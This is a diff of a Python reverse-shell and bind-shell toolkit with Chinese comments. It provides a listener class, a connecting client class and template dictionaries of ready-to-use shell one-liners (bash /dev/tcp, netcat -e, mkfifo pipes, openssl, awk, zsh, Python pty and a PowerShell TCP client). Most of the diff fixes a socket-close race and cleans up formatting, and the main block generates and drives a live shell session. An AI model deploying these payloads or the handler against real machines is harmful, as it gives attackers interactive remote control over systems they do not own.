@@ -1,4 +1,5 @@
 import dataclasses
+import errno
 import socket
 import threading
 import time
@@ -22,7 +23,7 @@ class RecvData:
 
 # ── 基础异常 ──────────────────────────────────────────────
 class TcpShellRError(Exception):
-    """TcpShell 基础异常"""
+    """TcpShellR 基础异常"""
 
 
 class TcpShellBError(Exception):
@@ -30,14 +31,27 @@ class TcpShellBError(Exception):
 
 
 # ── 工具函数 ──────────────────────────────────────────────
-def _safe_close_socket(sock: socket.socket | None, _name: str = "socket") -> None:
-    """安全关闭 socket，忽略所有异常"""
+def _safe_shutdown_socket(sock: socket.socket | None, name: str = "socket") -> None:
+    """
+    仅执行 shutdown，不 close。
+    shutdown 会使阻塞在 recv() 的线程立即得到 b""（EOF），
+    从而让 recv 线程沿正常路径退出，避免 EBADF。
+    """
     if sock is None:
         return
     try:
         sock.shutdown(socket.SHUT_RDWR)
     except OSError:
         pass
+
+
+def _safe_close_socket(sock: socket.socket | None, name: str = "socket") -> None:
+    """
+    安全关闭 socket（仅 close，不 shutdown）。
+    调用前须确保 recv 线程已退出，否则会引发 EBADF。
+    """
+    if sock is None:
+        return
     try:
         sock.close()
     except OSError:
@@ -92,7 +106,7 @@ class _TcpShellBase:
 
     def output(self, timeout: float = 5.0, idle_ms: int = 200, encoding: str = "utf-8") -> str | None:
         """
-        等待数据到达，收到第一个 RecvData 后，若连续 idle_ms 毫秒内无新数据则认为数据接收完毕并返回。
+        等待数据到达，收到第一个 RecvData 后，若连续 idle_ms 毫秒内无新数据则认为接收完毕并返回。
         """
         if not self._data_event.wait(timeout=timeout):
             return None
@@ -110,11 +124,9 @@ class _TcpShellBase:
             with self._lock:
                 current_seen = len(self.buffer)
 
-            # 如果没有触发唤醒且数量没变，说明真的闲置了 idle_sec 时间
             if not hit and last_seen == current_seen:
                 break
 
-        # 提取数据并清空状态
         with self._lock:
             if not self.buffer:
                 return None
@@ -125,7 +137,7 @@ class _TcpShellBase:
         return raw_data.decode(encoding, errors="replace")
 
     def send(self, data: str | bytes) -> bool:
-        """发送数据到当前连接。"""
+        """发送数据到当前连接"""
         sock = self._get_active_socket()
         if sock is None:
             debug_log("无连接，无法发送")
@@ -149,7 +161,9 @@ class _TcpShellBase:
         raise NotImplementedError
 
     def _recv_loop(self, sock: socket.socket) -> None:
-        """接收循环（在独立线程中运行）"""
+        """
+        接收循环（在独立线程中运行）。
+        """
         while not self._stop_event.is_set():
             try:
                 chunk = sock.recv(_RECV_BUFFER_SIZE)
@@ -159,7 +173,10 @@ class _TcpShellBase:
                 debug_log("连接被对端重置 (ConnectionReset)")
                 break
             except OSError as e:
-                debug_log(f"recv 异常: {e}")
+                if e.errno == errno.EBADF:
+                    debug_log("recv 退出：socket 已关闭 (EBADF)")
+                else:
+                    debug_log(f"recv 异常: {e}")
                 break
 
             if not chunk:
@@ -222,23 +239,41 @@ class TcpShellR(_TcpShellBase):
         self._accept_thread.start()
         return self
 
-    def stop(self):
+    def stop(self) -> None:
+        """
+        安全停止服务器。
+
+        修复（原竞态根因）：原实现先 close fd 再 join recv 线程，
+        导致 recv 线程在 fd 已销毁后调用 recv() 得到 EBADF。
+
+        顺序：
+          1. set stop_event —— 通知所有循环退出
+          2. shutdown conn  —— 使 recv() 立即返回 b""，recv 线程沿正常 EOF 路径退出
+          3. join recv 线程 —— 等待 recv 线程完全退出
+          4. close conn fd  —— 此时 recv 线程已不再使用该 fd，安全关闭
+          5. 关闭 server_sock 并 join accept 线程
+        """
         self._stop_event.set()
         self._data_event.set()
 
         with self._lock:
             conn, self._conn = self._conn, None
             self._conn_addr = None
+        _safe_shutdown_socket(conn, "client connection")
+
+        _safe_join_thread(self._recv_thread)
+        self._recv_thread = None
+
         _safe_close_socket(conn, "client connection")
 
+        _safe_shutdown_socket(self._server_sock, "server socket")
         _safe_close_socket(self._server_sock, "server socket")
         self._server_sock = None
         self._bound_port = None
 
         _safe_join_thread(self._accept_thread)
-        _safe_join_thread(self._recv_thread)
         self._accept_thread = None
-        self._recv_thread = None
+
         debug_log("已停止")
 
     def __enter__(self) -> "TcpShellR":
@@ -262,12 +297,13 @@ class TcpShellR(_TcpShellBase):
             return self._conn
 
     def _on_recv_loop_exit(self, sock: socket.socket) -> None:
+        """recv 线程退出时清理连接引用（不 close fd，由 stop() 统一管理）"""
         with self._lock:
             if self._conn is sock:
                 self._conn = None
                 self._conn_addr = None
 
-    def _accept_loop(self):
+    def _accept_loop(self) -> None:
         while not self._stop_event.is_set():
             server_sock = self._server_sock
             if server_sock is None:
@@ -286,6 +322,7 @@ class TcpShellR(_TcpShellBase):
             with self._lock:
                 if self._conn is not None:
                     debug_log("已有连接，拒绝新连接")
+                    _safe_shutdown_socket(conn, "rejected connection")
                     _safe_close_socket(conn, "rejected connection")
                     continue
                 self._conn = conn
@@ -294,16 +331,20 @@ class TcpShellR(_TcpShellBase):
             if self._recv_thread is not None and self._recv_thread.is_alive():
                 _safe_join_thread(self._recv_thread, timeout=2.0)
 
-            self._recv_thread = threading.Thread(target=self._recv_loop, args=(conn,), daemon=True,
-                                                 name="TcpShell-recv")
+            self._recv_thread = threading.Thread(
+                target=self._recv_loop, args=(conn,), daemon=True, name="TcpShell-recv"
+            )
             assert isinstance(self._recv_thread, threading.Thread)
             self._recv_thread.start()
 
 
 # ── TcpShellB：绑定 Shell 客户端 ──────────────────────────────────────────────
 class TcpShellB(_TcpShellBase):
-    def __init__(self, on_recv: Callable[[bytes], bytes] | None = None, on_send: Callable[[bytes], bytes] | None = None,
-                 max_buffer: int = 1000, connect_timeout: float = 10.0, recv_timeout: float = 5.0):
+    def __init__(self, on_recv: Callable[[bytes], bytes] | None = None,
+                 on_send: Callable[[bytes], bytes] | None = None,
+                 max_buffer: int = 1000,
+                 connect_timeout: float = 10.0,
+                 recv_timeout: float = 5.0):
         super().__init__(on_recv, on_send, max_buffer)
         self.connect_timeout = connect_timeout
         self.recv_timeout = recv_timeout
@@ -327,7 +368,9 @@ class TcpShellB(_TcpShellBase):
             self._sock = sock
         self._connected.set()
 
-        self._recv_thread = threading.Thread(target=self._recv_loop, args=(sock,), daemon=True, name="TcpShellB-recv")
+        self._recv_thread = threading.Thread(
+            target=self._recv_loop, args=(sock,), daemon=True, name="TcpShellB-recv"
+        )
         assert isinstance(self._recv_thread, threading.Thread)
         self._recv_thread.start()
         return self
@@ -353,9 +396,14 @@ class TcpShellB(_TcpShellBase):
                 if sleep_time > 0:
                     self._stop_event.wait(timeout=sleep_time)
 
-        raise TcpShellBError(f"连接超时（{self.connect_timeout}s）{host}:{port}: {last_err}") from last_err
+        raise TcpShellBError(
+            f"连接超时（{self.connect_timeout}s）{host}:{port}: {last_err}"
+        ) from last_err
 
-    def disconnect(self):
+    def disconnect(self) -> None:
+        """
+        安全断开连接。
+        """
         self._stop_event.set()
         self._data_event.set()
         self._connected.clear()
@@ -364,9 +412,11 @@ class TcpShellB(_TcpShellBase):
             sock, self._sock = self._sock, None
             self._target_addr = None
 
-        _safe_close_socket(sock, "connection")
+        _safe_shutdown_socket(sock, "connection")
         _safe_join_thread(self._recv_thread)
         self._recv_thread = None
+
+        _safe_close_socket(sock, "connection")
         debug_log("已断开连接")
 
     def __enter__(self) -> "TcpShellB":
@@ -380,19 +430,18 @@ class TcpShellB(_TcpShellBase):
         with self._lock:
             return self._sock is not None and self._connected.is_set()
 
-
     def _get_active_socket(self) -> socket.socket | None:
         with self._lock:
             return self._sock
 
     def _on_recv_loop_exit(self, sock: socket.socket) -> None:
+        """recv 线程退出时清理状态（不 close fd，由 disconnect() 统一管理）"""
         self._connected.clear()
         with self._lock:
             if self._sock is sock:
-                _safe_close_socket(self._sock)
                 self._sock = None
 
-    def interactive(self):
+    def interactive(self) -> None:
         """交互模式"""
         if not self.is_connected():
             print("错误：未连接到目标")
@@ -402,7 +451,7 @@ class TcpShellB(_TcpShellBase):
         print("[*] 输入 'exit' 或按 Ctrl+C 退出")
         print("-" * 50)
 
-        def print_output():
+        def print_output() -> None:
             while not self._stop_event.is_set() and self.is_connected():
                 if self._data_event.wait(timeout=0.5):
                     with self._lock:
@@ -413,7 +462,7 @@ class TcpShellB(_TcpShellBase):
                         else:
                             raw = b""
                     if raw:
-                        print(raw.decode(errors="replace"), end='', flush=True)
+                        print(raw.decode(errors="replace"), end="", flush=True)
 
         output_thread = threading.Thread(target=print_output, daemon=True)
         output_thread.start()
@@ -422,7 +471,7 @@ class TcpShellB(_TcpShellBase):
             while self.is_connected():
                 try:
                     user_input = input()
-                    if user_input.strip().lower() == 'exit':
+                    if user_input.strip().lower() == "exit":
                         break
                     self.sendline(user_input)
                 except EOFError:
@@ -435,41 +484,66 @@ class TcpShellB(_TcpShellBase):
 
 # ── Shell 命令生成函数 ──────────────────────────────────────────────
 _REVERSE_SHELL_TEMPLATES = {
-    'bash_i': 'bash -i >& /dev/tcp/{ip}/{port} 0>&1',
-    'bash_196': '0<&196;exec 196<>/dev/tcp/{ip}/{port}; bash <&196 >&196 2>&196',
-    'bash_read_line': 'exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done',
-    'nc_c_bash': 'nc -c bash {ip} {port}',
-    'nc_c_sh': 'nc -c sh {ip} {port}',
-    'nc_e_bash': 'nc {ip} {port} -e /bin/bash',
-    'nc_e_sh': 'nc {ip} {port} -e /bin/sh',
-    'busybox_nc_e_bash': 'busybox nc {ip} {port} -e /bin/bash',
-    'busybox_nc_e_sh': 'busybox nc {ip} {port} -e /bin/sh',
-    'curl_bash': "C='curl -Ns telnet://{ip}:{port}'; $C </dev/null 2>&1 | bash 2>&1 | $C >/dev/null",
-    'awk': 'awk \'BEGIN {{s = "/inet/tcp/0/{ip}/{port}"; while(42) {{ do{{ printf "shell>" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != "exit") close(s); }}}}\' /dev/null',
-    'zsh': "zsh -c 'zmodload zsh/net/tcp && ztcp {ip} {port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'",
-    'python3_bash': 'export RHOST="{ip}";export RPORT={port};python3 -c \'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")\'',
-    'python3_sh': 'export RHOST="{ip}";export RPORT={port};python3 -c \'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")\'',
-    'nc_mkfifo_bash': 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc {ip} {port} >/tmp/f',
-    'nc_mkfifo_sh': 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {ip} {port} >/tmp/f',
-    'openssl_mkfifo_bash': 'mkfifo /tmp/s; bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {ip}:{port} > /tmp/s; rm /tmp/s',
-    'openssl_mkfifo_sh': 'mkfifo /tmp/s; sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {ip}:{port} > /tmp/s; rm /tmp/s',
-    'powershell1': '$LHOST = "{ip}"; $LPORT = {port}; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) {{ while ($NetworkStream.DataAvailable) {{ $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }}; if ($TCPClient.Connected -and $Code.Length -gt 1) {{ $Output = try {{ Invoke-Expression ($Code) 2>&1 }} catch {{ $_ }}; $StreamWriter.Write("$Output`n"); $Code = $null }} }}; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()',
+    "bash_i": "bash -i >& /dev/tcp/{ip}/{port} 0>&1",
+    "bash_196": "0<&196;exec 196<>/dev/tcp/{ip}/{port}; bash <&196 >&196 2>&196",
+    "bash_read_line": "exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done",
+    "nc_c_bash": "nc -c bash {ip} {port}",
+    "nc_c_sh": "nc -c sh {ip} {port}",
+    "nc_e_bash": "nc {ip} {port} -e /bin/bash",
+    "nc_e_sh": "nc {ip} {port} -e /bin/sh",
+    "busybox_nc_e_bash": "busybox nc {ip} {port} -e /bin/bash",
+    "busybox_nc_e_sh": "busybox nc {ip} {port} -e /bin/sh",
+    "curl_bash": "C='curl -Ns telnet://{ip}:{port}'; $C </dev/null 2>&1 | bash 2>&1 | $C >/dev/null",
+    "awk": (
+        "awk 'BEGIN {{s = \"/inet/tcp/0/{ip}/{port}\"; while(42) {{ do{{ printf \"shell>\" |& s; "
+        "s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} "
+        "while(c != \"exit\") close(s); }}}}' /dev/null"
+    ),
+    "zsh": "zsh -c 'zmodload zsh/net/tcp && ztcp {ip} {port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'",
+    "python3_bash": (
+        'export RHOST="{ip}";export RPORT={port};python3 -c \''
+        "import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));"
+        "[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"bash\")'"
+    ),
+    "python3_sh": (
+        'export RHOST="{ip}";export RPORT={port};python3 -c \''
+        "import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));"
+        "[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"sh\")'"
+    ),
+    "nc_mkfifo_bash": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc {ip} {port} >/tmp/f",
+    "nc_mkfifo_sh": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {ip} {port} >/tmp/f",
+    "openssl_mkfifo_bash": (
+        "mkfifo /tmp/s; bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {ip}:{port} > /tmp/s; rm /tmp/s"
+    ),
+    "openssl_mkfifo_sh": (
+        "mkfifo /tmp/s; sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {ip}:{port} > /tmp/s; rm /tmp/s"
+    ),
+    "powershell1": (
+        "$LHOST = \"{ip}\"; $LPORT = {port}; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); "
+        "$NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); "
+        "$StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; "
+        "$Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) {{ "
+        "while ($NetworkStream.DataAvailable) {{ $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); "
+        "$Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }}; "
+        "if ($TCPClient.Connected -and $Code.Length -gt 1) {{ "
+        "$Output = try {{ Invoke-Expression ($Code) 2>&1 }} catch {{ $_ }}; "
+        "$StreamWriter.Write(\"$Output`n\"); $Code = $null }} }}; "
+        "$TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()"
+    ),
 }
 
 _BIND_SHELL_TEMPLATES = {
-    'nc_l_bash': 'nc -l -p {port} -e /bin/bash',
-    'nc_mkfifo_sh': 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc -lvnp {port} > /tmp/f',
-    'nc_mkfifo_bash': 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1 | nc -lvnp {port} > /tmp/f',
-    'python3': 'python3 -c \'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",{port}));s1.listen(1);c,a=s1.accept();while True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")\'',
+    "nc_l_bash": "nc -l -p {port} -e /bin/bash",
+    "nc_mkfifo_sh": "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc -lvnp {port} > /tmp/f",
+    "nc_mkfifo_bash": "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1 | nc -lvnp {port} > /tmp/f",
+    "python3": (
+        "python3 -c 'exec(\"\"\"import socket as s,subprocess as sp;"
+        "s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);"
+        "s1.bind((\\\"0.0.0.0\\\",{port}));s1.listen(1);c,a=s1.accept();"
+        "while True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);"
+        "c.sendall(p.stdout.read()+p.stderr.read())\"\"\")\'"
+    ),
 }
-
-
-def _gen_shell_cmd(template_key: str, templates: dict, **kwargs) -> str:
-    """通用的 shell 命令生成函数"""
-    template = templates.get(template_key)
-    if template is None:
-        raise ValueError(f"Unknown template: {template_key}")
-    return template.format(**kwargs)
 
 
 def gen_shell_b_cmd(name: str, port: int) -> str | None:
@@ -477,7 +551,7 @@ def gen_shell_b_cmd(name: str, port: int) -> str | None:
     根据名称生成绑定 Shell 命令
 
     Args:
-        name: 模板名称，例如 'nc_l_bash', 'nc_mkfifo_bash', 'nc_python3' 等
+        name: 模板名称，例如 'nc_l_bash', 'nc_mkfifo_bash', 'python3' 等
         port: 监听端口
 
     Returns:
@@ -522,20 +596,17 @@ def gen_shell_r_cmd(name: str, ip: str, port: int) -> str | None:
 if __name__ == "__main__":
     from tool.base import wait, get_local_ip, RunCmd
 
-    _ip = get_local_ip()
-    if not _ip:
-        _ip = "0.0.0.0"
+    _ip = get_local_ip() or "0.0.0.0"
 
     with TcpShellR() as shell:
-        def run(cmd):
+        def run(cmd: str) -> None:
             shell.sendline(cmd)
             print("##############")
             print(f"> {cmd}")
             print(shell.output())
             print("##############")
 
-
-        cmd_r = gen_shell_r_cmd("busybox_nc_e_sh",_ip, shell.port())
+        cmd_r = gen_shell_r_cmd("busybox_nc_e_sh", _ip, shell.port())
         if not cmd_r:
             exit(-1)
         print(cmd_r)
@@ -549,16 +620,15 @@ if __name__ == "__main__":
             s.stop()
 
     with TcpShellB() as shell:
-        def run(cmd):
+        def run(cmd: str) -> None:
             shell.sendline(cmd)
             print("##############")
             print(f"> {cmd}")
             print(shell.output())
             print("##############")
 
-
         p = 9000
-        cmd_b = gen_shell_b_cmd("nc_mkfifo_sh",p)
+        cmd_b = gen_shell_b_cmd("nc_mkfifo_sh", p)
         if not cmd_b:
             exit(-1)
         print(cmd_b)
